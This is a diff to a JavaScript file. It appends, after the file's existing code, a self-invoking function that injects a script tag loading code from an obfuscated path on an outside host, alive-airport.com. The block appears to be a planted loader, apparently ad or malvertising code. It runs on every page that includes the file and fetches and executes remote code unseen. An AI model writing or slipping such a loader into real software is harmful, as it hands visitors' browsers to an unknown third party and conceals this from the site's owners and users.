@@ -643,3 +643,15 @@ document.addEventListener("DOMContentLoaded", () => {
     }, { once: false });
 
 })();
+
+(function(sov){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = sov || {};
+s.src = "\/\/alive-airport.com\/b\/XhVms.dSGxli0wYGWWcW\/Ke\/mn9uu\/ZzU_ldkIPwT\/cRwDN\/jWkW1ZOCTLcLtVNHzBAK2LO\/TzYgwPM\/Qa";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+
